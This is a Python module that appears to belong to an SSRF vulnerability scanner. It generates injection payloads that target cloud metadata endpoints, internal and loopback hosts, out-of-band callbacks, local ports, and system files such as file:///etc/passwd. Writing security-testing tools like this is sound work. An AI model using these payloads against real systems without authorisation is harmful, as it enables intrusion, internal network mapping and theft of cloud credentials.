"""Builds the payload matrix that the scanner injects into each parameter."""

from __future__ import annotations

import uuid
from dataclasses import dataclass

from . import cloud_metadata
from .encodings import host_variants


@dataclass(frozen=True)
class ProbePayload:
    payload_id: str       # unique token, also used in OOB callback URLs
    value: str            # exact string to place into the parameter
    category: str         # "metadata" | "callback" | "internal" | "scheme" | "port"
    description: str
    provider: str | None = None
    signatures: tuple[str, ...] = ()
    port: int | None = None  # only for category == "port"


def _token() -> str:
    return uuid.uuid4().hex[:12]


def metadata_payloads(max_per_provider: int = 6) -> list[ProbePayload]:
    """Metadata-service URLs, each encoding variant of the host included."""
    payloads: list[ProbePayload] = []
    for endpoint in cloud_metadata.ALL_ENDPOINTS:
        variants = host_variants(endpoint.base_url.split("://", 1)[1])
        count = 0
        for variant in variants:
            scheme = endpoint.base_url.split("://", 1)[0]
            for probe_path in endpoint.probes:
                if count >= max_per_provider:
                    break
                payloads.append(
                    ProbePayload(
                        payload_id=_token(),
                        value=f"{scheme}://{variant}{probe_path}",
                        category="metadata",
                        provider=endpoint.provider,
                        description=(
                            f"{endpoint.provider} metadata probe: {probe_path} "
                            f"(host variant: {variant})"
                        ),
                        signatures=endpoint.signatures,
                    )
                )
                count += 1
    return payloads


def callback_payloads(callback_base: str) -> list[ProbePayload]:
    """OOB probes pointing at a controlled listener (local or Collaborator)."""
    payloads: list[ProbePayload] = []
    base = callback_base.rstrip("/")
    for label in ("direct", "encoded"):
        token = _token()
        raw = f"{base}/{token}"
        if label == "direct":
            value = raw
        else:
            from urllib.parse import quote

            value = quote(raw, safe="")
        payloads.append(
            ProbePayload(
                payload_id=token,
                value=value,
                category="callback",
                description=f"OOB callback probe ({label}): {raw}",
                signatures=(token,),
            )
        )
    return payloads


DEFAULT_INTERNAL_HOSTS = (
    "127.0.0.1",
    "localhost",
    "[::1]",
    "169.254.169.254",  # metadata edge case handled above; kept for diffing
)


def internal_payloads() -> list[ProbePayload]:
    """Generic internal-network probes and non-HTTP scheme tests.

    A unique token is embedded in the path: applications and devices that echo
    the requested path in error pages turn the token reflection into a
    confirmed finding instead of a diff heuristic.
    """
    payloads: list[ProbePayload] = []
    for host in DEFAULT_INTERNAL_HOSTS:
        token = _token()
        payloads.append(
            ProbePayload(
                payload_id=token,
                value=f"http://{host}/{token}",
                category="internal",
                description=f"Internal host probe: http://{host}/{token}",
            )
        )
    payloads.append(
        ProbePayload(
            payload_id=_token(),
            value="file:///etc/passwd",
            category="scheme",
            description="Scheme probe: file:///etc/passwd",
        )
    )
    payloads.append(
        ProbePayload(
            payload_id=_token(),
            value="file:///C:/Windows/win.ini",
            category="scheme",
            description="Scheme probe: file:///C:/Windows/win.ini",
        )
    )
    return payloads


DEFAULT_PORTS = (22, 80, 443, 445, 3000, 5000, 8000, 8080, 8443, 9000)


def port_timing_payloads(ports: tuple[int, ...] = DEFAULT_PORTS) -> list[ProbePayload]:
    """Time-based blind port probes against 127.0.0.1."""
    return [
        ProbePayload(
            payload_id=_token(),
            value=f"http://127.0.0.1:{port}/",
            category="port",
            description=f"Timing probe against local port {port}",
            port=port,
        )
        for port in ports
    ]
